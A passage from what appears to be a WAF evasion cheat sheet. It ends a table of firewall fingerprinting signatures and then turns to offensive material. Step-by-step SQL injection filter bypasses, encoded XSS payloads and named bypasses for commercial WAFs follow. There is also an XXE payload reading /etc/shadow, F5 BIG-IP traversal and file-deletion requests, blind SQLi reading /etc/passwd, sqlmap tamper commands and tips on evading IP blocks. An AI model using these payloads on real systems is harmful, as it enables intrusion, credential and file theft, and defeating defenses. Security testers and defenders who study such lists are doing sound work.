        <td>
            <ul>
                <li><b>Detectability: </b>Difficult</li>
                <li><b>Detection Methodology:</b></li>
                <ul>
                    <li>Response code returned is <code>404 Not Found</code> upon malicious requests.</li>
                    <li>Blocked response page contains either of the following text:</li>
                    <ul>
                        <li><code>BRICK-50</code> keyword.</li>
                        <li><code>404 Not Found</code> text.</li>
                    </ul>
                </ul>
            </ul>
        </td>
    </tr>
    <tr>
        <td>
            StackPath (StackPath LLC)
        </td>
        <td>
            <ul>
                <li><b>Detectability: </b>Difficult</li>
                <li><b>Detection Methodology:</b></li>
                <ul>
                    <li>Blocked response page contains<br> <code>You performed an action that triggered the service and blocked your request</code>.</li>
                </ul>
            </ul>
        </td>
    </tr>
    <tr>
        <td>
            Stingray (RiverBed/Brocade)
        </td>
        <td>
            <ul>
                <li><b>Detectability: </b>Difficult</li>
                <li><b>Detection Methodology:</b></li>
                <ul>
                    <li>Blocked response code returns <code>403 Forbidden</code> or <code>500 Internal Error</code>.</li>
                    <li>Response headers contain the <code>X-Mapping</code> header field name.</li>
                </ul>
            </ul>
        </td>
    </tr>
    <tr>
        <td>
            Sucuri CloudProxy
        </td>
        <td>
            <ul>
                <li><b>Detectability: </b>Easy</li>
                <li><b>Detection Methodology:</b></li>
                <ul>
                    <li>Response headers may contain <code>Sucuri</code> or <code>Cloudproxy</code> values.</li>
                    <li>Blocked response page contains the following text:</li>
                    <ul>
                        <li><code>Access Denied</code> and <code>Sucuri Website Firewall</code> texts.</li>
                        <li>Email <code>cloudproxy@sucuri.net</code>.</li>
                    </ul>
                    <li>Returns <code>403 Forbidden</code> response code upon blocking.</li>
                </ul>
            </ul>
        </td>
    </tr>
    <tr>
        <td>
            Tencent Cloud WAF
        </td>
        <td>
            <ul>
                <li><b>Detectability: </b>Moderate</li>
                <li><b>Detection Methodology:</b></li>
                <ul>
                    <li>Blocked response code returns <code>405 Method Not Allowed</code> error.</li>
                    <li>Blocked response page contains reference to <code>waf.tencent-cloud.com</code> URL.</li>
                </ul>
            </ul>
        </td>
    </tr>
    <tr>
        <td>
            TrafficShield (F5 Networks)
        </td>
        <td>
            <ul>
                <li><b>Detectability: </b>Moderate</li>
                <li><b>Detection Methodology:</b></li>
                <ul>
                    <li>Response headers might contain <code>F5-TrafficShield</code> keyword.</li>
                    <li><code>ASINFO=</code> value might be detected in response headers.</li>
                </ul>
            </ul>
        </td>
    </tr>
    <tr>
        <td>
            URLMaster SecurityCheck (iFinity/DotNetNuke)
        </td>
        <td>
            <ul>
                <li><b>Detectability: </b>Moderate</li>
                <li><b>Detection Methodology:</b></li>
                <ul>
                    <li>Response headers might contain:
                    <ul>
                        <li><code>UrlMaster</code> keyword.</li>
                        <li><code>UrlRewriteModule</code> keyword.</li>
                        <li><code>SecurityCheck</code> keyword.</li>
                    </ul> 
                    <li>Blocked response code returned is <code>400 Bad Request</code> text.</li>
                </ul>
            </ul>
        </td>
    </tr>
    <tr>
        <td>
            URLScan (Microsoft)
        </td>
        <td>
            <ul>
                <li><b>Detectability: </b>Moderate</li>
                <li><b>Detection Methodology:</b></li>
                <ul>
                    <li>Response headers might contain <code>Rejected-by-URLScan</code> field value.</li>
                    <li>Blocked response page contains <code>Rejected-by-URLScan</code> text.</li>
                </ul>
            </ul>
        </td>
    </tr>
    <tr>
        <td>
            USP Secure Entry
        </td>
        <td>
            <ul>
                <li><b>Detectability: </b>Moderate</li>
                <li><b>Detection Methodology:</b></li>
                <ul>
                    <li>Response headers contain <code>Secure Entry Server</code> field value.</li>
                </ul>
            </ul>
        </td>
    </tr>
    <tr>
        <td>
            Varnish (OWASP)
        </td>
        <td>
            <ul>
                <li><b>Detectability: </b>Easy</li>
                <li><b>Detection Methodology:</b></li>
                <ul>
                    <li>Response page contains <code>Request rejected by xVarnish-WAF</code> text.</li>
                    <li>Malicious request returns <code>404 Not Found</code> Error.</li>
                </ul>
            </ul>
        </td>
    </tr>
    <tr>
        <td>
            VirusDie Firewall
        </td>
        <td>
            <ul>
                <li><b>Detectability: </b>Easy</li>
                <li><b>Detection Methodology:</b></li>
                <ul>
                    <li>Response page contains:</li>
                    <ul>
                        <li><code>http://cdn.virusdie.ru/splash/firewallstop.png</code> picture.</li>
                        <li><code>copy; Virusdie.ru</p></code> text.</li>
                        <li>Response page title contains <code>Virusdie</code> keyword.</li>
                        <li>Page metadata contains <code>name="FW_BLOCK"</code> keyword</li>
                    </ul>
                </ul>
            </ul>
        </td>
    </tr>
    <tr>
        <td>
            WallArm (Nginx)
        </td>
        <td>
            <ul>
                <li><b>Detectability: </b>Moderate</li>
                <li><b>Detection Methodology:</b></li>
                <ul>
                    <li>Response headers contain <code>nginx-wallarm</code> text.</li>
                </ul>
            </ul>
        </td>
    </tr>
    <tr>
        <td>
            WatchGuard Firewall
        </td>
        <td>
            <ul>
                <li><b>Detectability: </b>Moderate</li>
                <li><b>Detection Methodology:</b></li>
                <ul>
                    <li>Response headers contain <code>WatchGuard</code> header field value.</li>
                </ul>
            </ul>
        </td>
    </tr>
    <tr>
        <td>
            WebKnight (Aqtronix)
        </td>
        <td>
            <ul>
                <li><b>Detectability: </b>Easy</li>
                <li><b>Detection Methodology:</b></li>
                <ul>
                    <li>Response headers contain <code>WebKnight</code> keyword.</li>
                    <li>Blocked response page contains:</li>
                    <ul>
                        <li><code>WebKnight Application Firewall Alert</code> text warning.</li>
                        <li><code>AQTRONIX WebKnight</code> text.</li>
                    </ul>
                    <li>Blocked response code returned is <code>999 No Hacking</code>. :p</li>
                </ul>
            </ul>
        </td>
    </tr>
    <tr>
        <td>
            WP Cerber Firewall
        </td>
        <td>
            <ul>
                <li><b>Detectability: </b>Moderate</li>
                <li><b>Detection Methodology:</b></li>
                <ul>
                    <li>Blocked response page contains:
                    <ul>
                        <li><code>We're sorry, you are not allowed to proceed</code> text.</li>
                        <li><code>Your request looks suspicious or similar to automated requests from spam posting software</code> warning.</li>
                    </ul> 
                </ul>
            </ul>
        </td>
    </tr>
    <tr>
        <td>
            Yundun Firewall
        </td>
        <td>
            <ul>
                <li><b>Detectability: </b>Moderate</li>
                <li><b>Detection Methodology:</b></li>
                <ul>
                    <li>Headers contain the <code>yundun</code> keyword.</li>
                </ul>
            </ul>
        </td>
    </tr>
    <tr>
        <td>
            Yunsuo Firewall
        </td>
        <td>
            <ul>
                <li><b>Detectability: </b>Easy</li>
                <li><b>Detection Methodology:</b></li>
                <ul>
                    <li>Blocked response page contains image class reference to <code>.yunsuologo</code>.</li>
                    <li>Response headers contain the <code>yunsuo_session</code> field name.</li>
                </ul>
            </ul>
        </td>
    </tr>
    <tr>
        <td>
            ZenEdge Firewall
        </td>
        <td>
            <ul>
                <li><b>Detectability: </b>Easy</li>
                <li><b>Detection Methodology:</b></li>
                <ul>
                    <li>Blocked response page contains reference to <code>zenedge/assets/</code> directory.</li>
                    <li>Headers contain the <code>ZENEDGE</code> keyword.</li>
                </ul>
            </ul>
        </td>
    </tr>
</table>

# Evasion Techniques
Lets look at some methods of bypassing and evading WAFs.

## Fuzzing/Bruteforcing:
#### Method:  
Running a set of payloads against the URL/endpoint. Some nice fuzzing wordlists:
- Wordlists specifically for fuzzing - [Seclists Fuzzing](https://github.com/danielmiessler/SecLists/tree/master/Fuzzing).
- Can be done with automated tools like BurpSuite Intruder.

#### Technique:

- Load up your wordlist into Burp Intruder/custom fuzzer and start the bruteforce.
- Record/log all responses from the different payloads fuzzed.
- Use random user-agents, ranging from Chrome Desktop to iPhone browser.
- If blocking noticed, increase fuzz latency (eg. 2-4 secs)
- Always use proxies, since chances are real that your IP gets blocked.

__Drawback:__
- This method often fails. 
- Many a times your IP will be blocked (temporarily/permanently).

## Regex-Reversing:
### Method:
- Most efficient method of bypassing WAFs.
- Some WAFs rely upon matching the attack payloads with the signatures in their databases.
- Payload matches the reg-ex the WAF triggers alarm.

#### Techniques:

__Scenario 1: SQL Injection__

##### • Step 1:
__Keyword filer__: `and`, `or`, `union`  
__Possible PHP Filter Code__: `preg_match('/(and|or|union)/i', $id)`
- __Filtered Injection__: `union select user, password from users`
- __Bypassed Injection__: `1 || (select user from users where user_id = 1) = 'admin'`

##### • Step 2:
__Keyword filer__: `and`, `or`, `union`, `where`  
__Possible PHP Filter Code__: `preg_match('/(and|or|union|where)/i', $id)`
- __Filtered Injection__: `1 || (select user from users where user_id = 1) = 'admin'`
- __Bypassed Injection__: `1 || (select user from users limit 1) = 'admin'`

##### • Step 3:
__Keyword filer__: `and`, `or`, `union`, `where`, `limit`  
__Possible PHP Filter Code__: `preg_match('/(and|or|union|where|limit)/i', $id)`
- __Filtered Injection__: `1 || (select user from users limit 1) = 'admin'`
- __Bypassed Injection__: `1 || (select user from users group by user_id having user_id = 1) = 'admin'`

##### • Step 4:
__Keyword filer__: `and`, `or`, `union`, `where`, `limit`, `group by`  
__Possible PHP Filter Code__: `preg_match('/(and|or|union|where|limit|group by)/i', $id)`
- __Filtered Injection__: `1 || (select user from users group by user_id having user_id = 1) = 'admin'`
- __Bypassed Injection__: `1 || (select substr(group_concat(user_id),1,1) user from users ) = 1`

##### • Step 5:
__Keyword filer__: `and`, `or`, `union`, `where`, `limit`, `group by`, `select`  
__Possible PHP Filter Code__:    `preg_match('/(and|or|union|where|limit|group by|select)/i', $id)`
- __Filtered Injection__: `1 || (select substr(gruop_concat(user_id),1,1) user from users) = 1`
- __Bypassed Injection__: `1 || 1 = 1 into outfile 'result.txt'`
- __Bypassed Injection__: `1 || substr(user,1,1) = 'a'`

##### • Step 6:
__Keyword filer__: `and`, `or`, `union`, `where`, `limit`, `group by`, `select`, `'`  
__Possible PHP Filter Code__: `preg_match('/(and|or|union|where|limit|group by|select|\')/i', $id)`
- __Filtered Injection__: `1 || (select substr(gruop_concat(user_id),1,1) user from users) = 1`
- __Bypassed Injection__: `1 || user_id is not null`
- __Bypassed Injection__: `1 || substr(user,1,1) = 0x61`
- __Bypassed Injection__: `1 || substr(user,1,1) = unhex(61)`

##### • Step 7:
__Keyword filer__: `and`, `or`, `union`, `where`, `limit`, `group by`, `select`, `'`, `hex`  
__Possible PHP Filter Code__:    `preg_match('/(and|or|union|where|limit|group by|select|\'|hex)/i', $id)`
- __Filtered Injection__: `1 || substr(user,1,1) = unhex(61)`
- __Bypassed Injection__: `1 || substr(user,1,1) = lower(conv(11,10,36))`

##### • Step 8:
__Keyword filer__: `and`, `or`, `union`, `where`, `limit`, `group by`, `select`, `'`, `hex`, `substr`  
__Possible PHP Filter Code__:    `preg_match('/(and|or|union|where|limit|group by|select|\'|hex|substr)/i', $id)`
- __Filtered Injection__: `1 || substr(user,1,1) = lower(conv(11,10,36))`
- __Bypassed Injection__: `1 || lpad(user,7,1)`

##### • Step 9:
__Keyword filer__: `and`, `or`, `union`, `where`, `limit`, `group by`, `select`, `'`, `hex`, `substr`, `white space`  
__Possible PHP Filter Code__:    `preg_match('/(and|or|union|where|limit|group by|select|\'|hex|substr|\s)/i', $id)`
- __Filtered Injection__: `1 || lpad(user,7,1)`
- __Bypassed Injection__: `1%0b||%0blpad(user,7,1)`

---

__Scenario 2: Cross Site Scripting__

##### Step 1:
- Normal deliberate test:  
```
<script>alert()</script>
```
- Checking if the firewall is blocking only lowercase:  
```
<sCRipT>alert(1)</sCRiPt>
```
- Breaking firewall regex with new line (`\r\n`):
```
<script>
alert(1)</script>
```
- Bypass trial with hex notation:
```
%3C%73%63%72%69%70%74%3E%61%6C%65%72%74%28%31%29%3B%3C%2F%73%63%72%69%70%74%3E
```
- Bypass trials with ECMAScript6 variation:  
```
<svg><script>alert&DiacriticalGrave;1&DiacriticalGrave;</p>
<svg><script>alert`1`   
```
- Testing for recursive filters:  
```
<scr<script>ipt>alert(1);</scr</script>ipt>
```
- Bypass trials with anchor tags without whitespaces:  
```
<a/href=”j&Tab;a&Tab;v&Tab;asc&Tab;ri&Tab;pt:alert&lpar;1&rpar;”>
```
- Bypass trial with HTML encoded notation:
```
&#x3C;&#x73;&#x63;&#x72;&#x69;&#x70;&#x74;&#x3E;&#x61;&#x6C;&#x65;&#x72;&#x74;&#x28;&#x31;&#x29;&#x3B;&#x3C;&#x2F;&#x73;&#x63;&#x72;&#x69;&#x70;&#x74;&#x3E;
```
- Bypass trial with unicode encoding:
```
script/src="data&colon;text%2Fj\u0061v\u0061script,\u0061lert(1)"></script a=\u0061 & /=%2F
```
- Bypass trial via overflow technique:
```
<iframe src=j&NewLine;&Tab;a&NewLine;&Tab;&Tab;v&NewLine;&Tab;&Tab;&Tab;a&NewLine;&Tab;&Tab;&Tab;&Tab;s&NewLine;&Tab;&Tab;&Tab;&Tab;&Tab;c&NewLine;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;r&NewLine;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;i&NewLine;&Tab;&Tab; &Tab;&Tab;&Tab;&Tab;&Tab;&Tab;p&NewLine;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;t&NewLine;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&colon;a&NewLine;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;l&NewLine;&Tab;&Tab;&Tab;&Tab;&Tab; &Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;e&NewLine;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;r&NewLine;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;t&NewLine;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab; &Tab;&Tab;&Tab;&Tab;&Tab;%28&NewLine;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;1&NewLine;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;%29></iframe> ​
```

## Google Dorks Approach:
__Method:__
- There are a lot of known bypasses of various web application firewalls ([see section](#known-bypasses)).
- With the help of google dorks, we can easily find bypasses.

__Techniques:__  
Before anything else, its time to [hone up our skills via Google Dorks Cheat Sheet](http://pdf.textfiles.com/security/googlehackers.pdf).
- Normal search:  
`+<wafname> waf bypass`

- Searching for specific version exploits:  
`"<wafname> <version>" bypass`

- On [Exploit DB](https://exploit-db.com):  
`site:exploit-db.com +<wafname> bypass`

- On [0Day Inject0r DB](https://0day.today):  
`site:0day.today +<wafname> bypass`

- On [Twitter](https://twitter.com):  
`site:twitter.com +<wafname> bypass`

## Known Bypasses:
### __Cloudflare__ 
- XSS Bypass by [@ArbazKiraak](https://twitter.com/ArbazKiraak)
```
<a href="j&Tab;a&Tab;v&Tab;asc&NewLine;ri&Tab;pt&colon;\u0061\u006C\u0065\u0072\u0074&lpar;this['document']['cookie']&rpar;">X</a>`
```

### __Imperva SecureSphere__ 
- XSS Bypass by [@WAFNinja](https://waf.ninja)
```
%3Cimg%2Fsrc%3D%22x%22%2Fonerror%3D%22prom%5Cu0070t%2526%2523x28%3B%2526%2523x27%3B%2526%2523x58%3B%2526%2523x53%3B%2526%2523x53%3B%2526%2523x27%3B%2526%2523x29%3B%22%3E
```
- XSS Bypass by [@i_bo0om](https://twitter.com/i_bo0om)
```
<iframe/onload='this["src"]="javas&Tab;cript:al"+"ert``"';>
<img/src=q onerror='new Function`al\ert\`1\``'>
```
- SQLi Bypass by [@DRK1WI](https://www.exploit-db.com/?author=7740)
```
15 and '1'=(SELECT '1' FROM dual) and '0having'='0having'
```
- SQLi by [@Giuseppe D'Amore](https://www.exploit-db.com/?author=6413)
```
stringindatasetchoosen%%' and 1 = any (select 1 from SECURE.CONF_SECURE_MEMBERS where FULL_NAME like '%%dministrator' and rownum<=1 and PASSWORD like '0%') and '1%%'='1
```

### __Barracuda__ 
- Cross Site Scripting by [@WAFNinja](https://waf.ninja)
```
<body style="height:1000px" onwheel="alert(1)">
<div contextmenu="xss">Right-Click Here<menu id="xss" onshow="alert(1)">
<b/%25%32%35%25%33%36%25%36%36%25%32%35%25%33%36%25%36%35mouseover=alert(1)>
```
- HTML Injection by [@Global-Evolution](https://www.exploit-db.com/?author=2016)
```
GET /cgi-mod/index.cgi?&primary_tab=ADVANCED&secondary_tab=test_backup_server&content_only=1&&&backup_port=21&&backup_username=%3E%22%3Ciframe%20src%3Dhttp%3A//www.example.net/etc/bad-example.exe%3E&&backup_type=ftp&&backup_life=5&&backup_server=%3E%22%3Ciframe%20src%3Dhttp%3A//www.example.net/etc/bad-example.exe%3E&&backup_path=%3E%22%3Ciframe%20src%3Dhttp%3A//www.example.net/etc/bad-example.exe%3E&&backup_password=%3E%22%3Ciframe%20src%3Dhttp%3A//www.example.net%20width%3D800%20height%3D800%3E&&user=guest&&password=121c34d4e85dfe6758f31ce2d7b763e7&&et=1261217792&&locale=en_US
Host: favoritewaf.com
User-Agent: Mozilla/5.0 (compatible; MSIE5.01; Windows NT)
```

### __DotDefender__  
- R-XSS Bypass by [@WAFNinja](https://waf.ninja)
```
<svg/onload=prompt(1);>
<isindex action="javas&tab;cript:alert(1)" type=image>
<marquee/onstart=confirm(2)>
```
- GET - XSS Bypass by [@DavidK](https://www.exploit-db.com/?author=2741)
```
/search?q=%3Cimg%20src=%22WTF%22%20onError=alert(/0wn3d/.source)%20/%3E

<img src="WTF" onError="{var
{3:s,2:h,5:a,0:v,4:n,1:e}='earltv'}[self][0][v%2Ba%2Be%2Bs](e%2Bs%2Bv%2B
h%2Bn)(/0wn3d/.source)" />
```

- POST - XSS Bypass by [@DavidK](https://www.exploit-db.com/?author=2741)
```
<img src="WTF" onError="{var
{3:s,2:h,5:a,0:v,4:n,1:e}='earltv'}[self][0][v+a+e+s](e+s+v+h+n)(/0wn3d/
.source)" />
```

### __Fortinet Fortiweb__
- `pcre_expression` unvaidated XSS by [@Benjamin Mejri](https://www.exploit-db.com/?author=7854)
```
/waf/pcre_expression/validate?redir=/success&mkey=0%22%3E%3Ciframe%20src=http://vuln-lab.com%20onload=alert%28%22VL%22%29%20%3C
/waf/pcre_expression/validate?redir=/success%20%22%3E%3Ciframe%20src=http://vuln-lab.com%20onload=alert%28%22VL%22%29%20%3C&mkey=0 
```
- CSP Bypass by [@Binar10](https://www.exploit-db.com/exploits/18840)

POST Type Query
```
POST /<path>/login-app.aspx HTTP/1.1
Host: <host>
User-Agent: <any valid user agent string>
Accept-Encoding: gzip, deflate
Connection: keep-alive
Content-Type: application/x-www-form-urlencoded
Content-Length: <the content length must be at least 2399 bytes>

var1=datavar1&var2=datavar12&pad=<random data to complete at least 2399 bytes>
```
GET Type Query
```
http://<domain>/path?var1=vardata1&var2=vardata2&pad=<large arbitrary data>
```

### __F5 ASM__ 
- XSS Bypass by [@WAFNinja](https://waf.ninja)
```
<table background="javascript:alert(1)"></table>
"/><marquee onfinish=confirm(123)>a</marquee>
```

### __F5 BIG-IP__ 
- XSS Bypass by [@WAFNinja](https://waf.ninja/)
```
<body style="height:1000px" onwheel="[DATA]">
<div contextmenu="xss">Right-Click Here<menu id="xss" onshow="[DATA]">
<body style="height:1000px" onwheel="prom%25%32%33%25%32%36x70;t(1)">
<div contextmenu="xss">Right-Click Here<menu id="xss" onshow="prom%25%32%33%25%32%36x70;t(1)">
```
- POST Based XXE by [@Anonymous](https://www.exploit-db.com/?author=2168)
```
<?xml version="1.0" encoding='utf-8' ?>
<!DOCTYPE a [<!ENTITY e SYSTEM '/etc/shadow'> ]>
<message><dialogueType>&e;</dialogueType></message>
```
- F5 BIG-IP Directory Traversal by [@Anastasios Monachos](https://www.exploit-db.com/?author=2932)

Read Arbitrary File
```
/tmui/Control/jspmap/tmui/system/archive/properties.jsp?&name=../../../../../etc/passwd
```
Delete Arbitrary File
```
POST /tmui/Control/form HTTP/1.1
Host: site.com
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.9; rv:32.0) Gecko/20100101 Firefox/32.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Cookie: JSESSIONID=6C6BADBEFB32C36CDE7A59C416659494; f5advanceddisplay=""; BIGIPAuthCookie=89C1E3BDA86BDF9E0D64AB60417979CA1D9BE1D4; BIGIPAuthUsernameCookie=admin; F5_CURRENT_PARTITION=Common; f5formpage="/tmui/system/archive/properties.jsp?&name=../../../../../etc/passwd"; f5currenttab="main"; f5mainmenuopenlist=""; f5_refreshpage=/tmui/Control/jspmap/tmui/system/archive/properties.jsp%3Fname%3D../../../../../etc/passwd
Content-Type: application/x-www-form-urlencoded

_form_holder_opener_=&handler=%2Ftmui%2Fsystem%2Farchive%2Fproperties&handler_before=%2Ftmui%2Fsystem%2Farchive%2Fproperties&showObjList=&showObjList_before=&hideObjList=&hideObjList_before=&enableObjList=&enableObjList_before=&disableObjList=&disableObjList_before=&_bufvalue=icHjvahr354NZKtgQXl5yh2b&_bufvalue_before=icHjvahr354NZKtgQXl5yh2b&_bufvalue_validation=NO_VALIDATION&com.f5.util.LinkedAdd.action_override=%2Ftmui%2Fsystem%2Farchive%2Fproperties&com.f5.util.LinkedAdd.action_override_before=%2Ftmui%2Fsystem%2Farchive%2Fproperties&linked_add_id=&linked_add_id_before=&name=..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd&name_before=..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd&form_page=%2Ftmui%2Fsystem%2Farchive%2Fproperties.jsp%3F&form_page_before=%2Ftmui%2Fsystem%2Farchive%2Fproperties.jsp%3F&download_before=Download%3A+..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd&restore_before=Restore&delete=Delete&delete_before=Delete
```
- [F5 BIG-IP 11.6 SSL Virtual Server - 'Ticketbleed' Memory Disclosure](https://www.exploit-db.com/exploits/44446) by [@0x00String](https://www.exploit-db.com/?author=7028).
- [F5 BIG-IP Remote Root Authentication Bypass Vulnerability](https://www.exploit-db.com/exploits/19091) by [@Rel1k](https://www.exploit-db.com/?author=1593).

### F5 FirePass
- SQLi Bypass from [@Anonymous](https://www.exploit-db.com/?author=2168)
```
state=%2527+and+
(case+when+SUBSTRING(LOAD_FILE(%2527/etc/passwd%2527),1,1)=char(114)+then+
BENCHMARK(40000000,ENCODE(%2527hello%2527,%2527batman%2527))+else+0+end)=0+--+ 
```

### __Citrix NetScaler NS10.5__ 
- HTTP Parameter Pollution [@BGA Security](https://www.exploit-db.com/?author=7396)
```
<soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/" xmlns:tem="http://tempuri.org/">
   <soapenv:Header/>
   <soapenv:Body>
        <string>’ union select current_user, 2#</string>
    </soapenv:Body>
</soapenv:Envelope>
```

- `generic_api_call.pl` XSS by [@NNPoster](https://www.exploit-db.com/?author=6654)
```
/ws/generic_api_call.pl?function=statns&standalone=%3c/script%3e%3cscript%3ealert(document.cookie)%3c/script%3e%3cscript%3e
``` 

### __WebKnight__ 
- Cross Site Scripting _([Source](https://waf.ninja/review-wafninja/))_
```
<isindex action=j&Tab;a&Tab;vas&Tab;c&Tab;r&Tab;ipt:alert(1) type=image>
<marquee/onstart=confirm(2)>
<details ontoggle=alert(1)>
<div contextmenu="xss">Right-Click Here<menu id="xss" onshow="alert(1)">
```

### __QuickDefense__ 
- Cross Site Scripting _([Source](https://waf.ninja/review-wafninja/))_
```
?<input type="search" onsearch="aler\u0074(1)">
<details ontoggle=alert(1)>
```

### __Apache__ 
- Writing method type in lowercase. _([Source](https://github.com/Bo0oM/WAF-bypass-Cheat-Sheet))_
```
get /login HTTP/1.1
Host: favoritewaf.com
User-Agent: Mozilla/4.0 (compatible; MSIE5.01; Windows NT)
```

### __IIS__ 
- Tabs before method _([Source](https://github.com/Bo0oM/WAF-bypass-Cheat-Sheet))_
```
    GET /login.php HTTP/1.1
Host: favoritewaf.com
User-Agent: Mozilla/4.0 (compatible; MSIE5.01; Windows NT)
```

## Awesome Tools
### WAF Fingerprinting:
__1. Fingerprinting with [NMap](https://nmap.org)__:  
Source: [GitHub](https://github.com/nmap/nmap) | [SVN](http://svn.nmap.org)
- Normal WAF Fingerprinting  
`nmap --script=http-waf-fingerprint <target>`

- Intensive WAF Fingerprinting  
`nmap --script=http-waf-fingerprint  --script-args http-waf-fingerprint.intensive=1 <target>`

- Generic Detection  
` nmap --script=http-waf-detect <target>`

__2. Fingerprinting with [WafW00f](https://github.com/EnableSecurity/wafw00f)__:  
Source: [GitHub](https://github.com/enablesecurity/wafw00f) | [Pypi](https://pypi.org/project/wafw00f)
```
wafw00f <target>
```

### WAF Testing:
- [WAFBench](https://github.com/microsoft/wafbench) - A WAF performance testing suite by [Microsoft](https://github.com/microsoft).
- [WAF Testing Framework](https://www.imperva.com/lg/lgw_trial.asp?pid=483) - A free WAF testing tool by [Imperva](https://imperva.com).

### WAF Evading:  
__1. Evading WAFs with [SQLMap Tamper Scripts](https://medium.com/@drag0n/sqlmap-tamper-scripts-sql-injection-and-waf-bypass-c5a3f5764cb3)__:
- General Tamper Testing
```
sqlmap -u <target> --level=5 --risk=3 -p 'item1' --tamper=apostrophemask,apostrophenullencode,base64encode,between,chardoubleencode,charencode,charunicodeencode,equaltolike,greatest,ifnull2ifisnull,multiplespaces,nonrecursivereplacement,percentage,randomcase,securesphere,space2comment,space2plus,space2randomblank,unionalltounion,unmagicquotes
```
- MSSQL Tamper Testing
```
sqlmap -u <target> --level=5 --risk=3 -p 'item1' --tamper=between,charencode,charunicodeencode,equaltolike,greatest,multiplespaces,nonrecursivereplacement,percentage,randomcase,securesphere,sp_password,space2comment,space2dash,space2mssqlblank,space2mysqldash,space2plus,space2randomblank,unionalltounion,unmagicquotes
```
- MySQL Tamper Testing
```
sqlmap -u <target> --level=5 --risk=3 -p 'item1' --tamper=between,bluecoat,charencode,charunicodeencode,concat2concatws,equaltolike,greatest,halfversionedmorekeywords,ifnull2ifisnull,modsecurityversioned,modsecurityzeroversioned,multiplespaces,nonrecursivereplacement,percentage,randomcase,securesphere,space2comment,space2hash,space2morehash,space2mysqldash,space2plus,space2randomblank,unionalltounion,unmagicquotes,versionedkeywords,versionedmorekeywords,xforwardedfor
``` 
- Generic Tamper Testing 
```
sqlmap -u <target> --level=5 --risk=3 -p 'item1' --tamper=apostrophemask,apostrophenullencode,appendnullbyte,base64encode,between,bluecoat,chardoubleencode,charencode,charunicodeencode,concat2concatws,equaltolike,greatest,halfversionedmorekeywords,ifnull2ifisnull,modsecurityversioned,modsecurityzeroversioned,multiplespaces,nonrecursivereplacement,percentage,randomcase,randomcomments,securesphere,space2comment,space2dash,space2hash,space2morehash,space2mssqlblank,space2mssqlhash,space2mysqlblank,space2mysqldash,space2plus,space2randomblank,sp_password,unionalltounion,unmagicquotes,versionedkeywords,versionedmorekeywords
```

__2. Evading WAFs with [WAFNinja](https://waf.ninja/)__  
Source: [GitHub](https://github.com/khalilbijjou/wafninja)
- Fuzzing  
`python wafninja.py fuzz -u <target> -t xss`

- Bypassing  
`python wafninja.py bypass -u <target> -p "name=<payload>&Submit=Submit" -t xss`

- Insert Fuzzing  
`python wafninja.py insert-fuzz -i select -e select -t sql`


__3. Evading WAFs with [WhatWaf](https://github.com/ekultek/whatwaf)__:  
Source: [GitHub](https://github.com/ekultek/whatwaf)
```
whatwaf -u <target> --ra --throttle 2
```

__4. Evading with [Bypass WAF](https://www.codewatch.org/blog/?p=408) - BurpSuite__:  
Source: [Burp Suite App Store](https://portswigger.net/bappstore/ae2611da3bbc4687953a1f4ba6a4e04c)
- Bypass WAF adds some headers to evade some WAF products:
```
X-Originating-IP: 127.0.0.1
X-Forwarded-For: 127.0.0.1
X-Remote-IP: 127.0.0.1
X-Remote-Addr: 127.0.0.1
```
- Create a session handling rule in Burp that invokes this extension.
- Modify the scope to include applicable tools and URLs.
- Configure the bypass options on the "Bypass WAF" tab.

## Blogs and Writeups
- [Web Application Firewall (WAF) Evasion Techniques #1](https://medium.com/secjuice/waf-evasion-techniques-718026d693d8) - By [@Secjuice](https://www.secjuice.com)
- [Web Application Firewall (WAF) Evasion Techniques #2](https://medium.com/secjuice/web-application-firewall-waf-evasion-techniques-2-125995f3e7b0) - By [@Secjuice](https://www.secjuice.com)
- [Web Application Firewall (WAF) Evasion Techniques #3](https://www.secjuice.com/web-application-firewall-waf-evasion/) - By [@Secjuice](https://www.secjuice.com)
- [SQL Injection Bypassing WAF](https://www.owasp.org/index.php/SQL_Injection_Bypassing_WAF) - By [@OWASP](https://owasp.com)
- [How To Reverse Engineer A Web Application Firewall Using Regular Expression Reversing](https://www.sunnyhoi.com/reverse-engineer-web-application-firewall-using-regular-expression-reversing/) - By [@SunnyHoi](https://sunnyhoi.com)
- [Bypassing Web-Application Firewalls by abusing SSL/TLS](https://0x09al.github.io/waf/bypass/ssl/2018/07/02/web-application-firewall-bypass.html) - By [@0x09AL](https://github.com/0x09al)

## Presentations & Research Papers
### Research Papers:
- [Protocol Level WAF Evasion](papers/Qualys%20Guide%20-%20Protocol-Level%20WAF%20Evasion.pdf) - A protocol level WAF evasion techniques and analysis by [Qualys](https://www.qualys.com).
- [Neural Network based WAF for SQLi](papers/Artificial%20Neural%20Network%20based%20WAF%20for%20SQL%20Injection.pdf) - A paper about building a neural network based WAF for detecting SQLi attacks.
